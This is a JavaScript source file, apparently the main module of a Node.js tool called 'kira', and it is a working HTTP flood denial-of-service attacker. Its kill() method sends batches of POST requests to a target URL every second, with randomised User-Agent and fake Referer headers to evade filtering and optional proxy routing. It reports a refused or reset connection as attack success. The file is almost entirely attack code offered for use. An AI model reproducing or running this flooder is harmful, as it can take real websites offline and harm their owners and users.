/*
 * kira
 * https://github.com/chrisenytc/kira
 *
 * Copyright (c) 2014, Christopher EnyTC
 * Licensed under the MIT license.
 */

'use strict';

/*
 * Module Dependencies
 */

var request = require('superagent'),
    random_ua = require('random-ua'),
    inquirer = require('inquirer'),
    pj = require('prettyjson').render,
    utils = require('./utils.js');

//Extends superagent
require('superagent-proxy')(request);

//Colors
require('colors');

/*
 * Private Methods
 */

/*
 * Public Methods
 */

/**
 * @class Kira
 *
 * @constructor
 *
 * Constructor responsible for provide api requests
 *
 * @example
 *
 *     var api = new Api();
 *
 */

var Api = module.exports = function Api() {
    //
};

/**
 * Method responsible for asking questions
 *
 * @example
 *
 *     api.prompt(prompts, cb);
 *
 * @method prompt
 * @public
 * @param {Object} prompts Array of prompt options
 * @param {Function} cb A callback
 */

Api.prototype.prompt = function prompt(prompts, cb) {
    inquirer.prompt(prompts, function(answers) {
        cb(answers);
    });
};

/**
 * Method responsible for send many requests to a target
 *
 * @example
 *
 *     api.kill('http://example.com', 200, 10000, 'https://54.234.95.169:80');
 *
 * @method kill
 * @public
 * @param {String} url Url of a target
 * @param {Number} maxLimit Maximum Connections
 * @param {Number} length Content length
 * @param {String} enableProxy Proxy address
 */

Api.prototype.kill = function kill(url, maxLimit, length, enableProxy) {
    var that = this;

    function attack() {
        for (var i = 0; i < maxLimit; i++) {
            if (enableProxy) {
                //Proxy Data
                var proxyData = that.getProxy(enableProxy);
                //Send request
                request
                    .post(url)
                    .set('User-Agent', random_ua.generate())
                    .set('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
                    .set('Referer', that.getReferer())
                    .set('Content-Length', length)
                    .set('Connection', 'keep-alive')
                    .proxy(proxyData)
                    .end(function(err, res) {
                        if (err) {
                            console.log('<------------------------------------------------>');
                            if (err.code === 'ECONNREFUSED' || err.code === 'ECONNRESET') {
                                console.log('[ ' + 'SUCCESS'.green.bold + ' ] =====>');
                            } else {
                                console.log('[ ' + 'WAITING'.yellow.bold + ' ] =====>');
                            }
                            console.log('  Target => ' + url.red);
                            console.log('  WorkerID => ' + utils.uid(8));
                            if (err.code === 'ECONNREFUSED') {
                                console.log('  Target Status => ' + 'OFFLINE'.red.bold);
                                console.log('  Attack Status => ' + 'SUCCESS'.green.bold);
                            }
                            if(err.code === 'ECONNRESET') {
                                console.log('  Target Status => ' + 'UNAVAILABLE'.red.bold);
                                console.log('  Attack Status => ' + 'SUCCESS'.green.bold);
                            }
                            console.log();
                            if (err.code !== 'ECONNREFUSED' && err.code !== 'ECONNRESET') {
                                console.log(pj(err));
                            }
                            console.log('<------------------------------------------------>');
                            return;
                        }
                        console.log();
                        console.log('[ ' + 'ATTACKING'.yellow.bold + ' ] =====>');
                        console.log('  Using proxy => ' + proxyData.white.bold);
                        console.log('  Attack to => ' + url.yellow);
                        console.log('  WORKER ID => ' + utils.uid(8));
                        console.log('  Target Status => ' + res.statusCode.toString().green.bold);
                        console.log('  Attack Status => ' + 'RECEIVED'.green.bold);
                        console.log();
                        console.log(pj(res.header));
                        console.log('<------------------------------------------------------>');
                    });
            } else {
                request
                    .post(url)
                    .set('User-Agent', random_ua.generate())
                    .set('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
                    .set('Referer', that.getReferer())
                    .set('Content-Length', length)
                    .set('Connection', 'keep-alive')
                    .end(function(err, res) {
                        if (err) {
                            console.log('<------------------------------------------------>');
                            if (err.code === 'ECONNREFUSED' || err.code === 'ECONNRESET') {
                                console.log('[ ' + 'SUCCESS'.green.bold + ' ] =====>');
                            } else {
                                console.log('[ ' + 'WAITING'.yellow.bold + ' ] =====>');
                            }
                            console.log('  Target => ' + url.red);
                            console.log('  WorkerID => ' + utils.uid(8));
                            if (err.code === 'ECONNREFUSED') {
                                console.log('  Target Status => ' + 'OFFLINE'.red.bold);
                                console.log('  Attack Status => ' + 'SUCCESS'.green.bold);
                            }
                            if(err.code === 'ECONNRESET') {
                                console.log('  Target Status => ' + 'UNAVAILABLE'.red.bold);
                                console.log('  Attack Status => ' + 'SUCCESS'.green.bold);
                            }
                            console.log();
                            if (err.code !== 'ECONNREFUSED' && err.code !== 'ECONNRESET') {
                                console.log(pj(err));
                            }
                            console.log('<------------------------------------------------>');
                            return;
                        }
                        console.log();
                        console.log('[ ' + 'ATTACKING'.yellow.bold + ' ] =====>');
                        console.log('  Attack to => ' + url.yellow);
                        console.log('  WORKER ID => ' + utils.uid(8));
                        console.log('  Target Status => ' + res.statusCode.toString().green.bold);
                        console.log('  Attack Status => ' + 'RECEIVED'.green.bold);
                        console.log();
                        console.log(pj(res.header));
                        console.log('<------------------------------------------------------>');
                    });
            }
        };
    }

    //Start Killer
    var killer = setInterval(attack, 1000);
};

/**
 * Method responsible for get random proxy address
 *
 * @example
 *
 *     api.getProxy();
 *
 * @method getProxy
 * @public
 * @param {String} address Proxy address
 */

Api.prototype.getProxy = function getProxy(address) {
    return address;
};

/**
 * Method responsible for get random referers
 *
 * @example
 *
 *     api.getReferer();
 *
 * @method getReferer
 * @public
 */

Api.prototype.getReferer = function getReferer() {
    return [
        'https://www.google.com/search?q=' + utils.uid(8),
        'https://' + utils.uniqueToken() + '.com',
        'https://' + utils.uniqueToken() + '.net',
        'https://' + utils.uniqueToken() + '.org',
        'https://' + utils.uniqueToken() + '.me',
        'https://' + utils.uniqueToken() + '.io',
        'https://' + utils.uniqueToken() + '.io',
        'https://' + utils.uniqueToken() + '.la',
        'https://' + utils.uniqueToken() + '.asia',
        'https://' + utils.uniqueToken() + '.tc',
        'https://' + utils.uniqueToken() + '.gl',
        'https://' + utils.uniqueToken() + '.uk',
        'https://' + utils.uniqueToken() + '.tk'
    ][utils.getRandomInt(0, 12)];
};
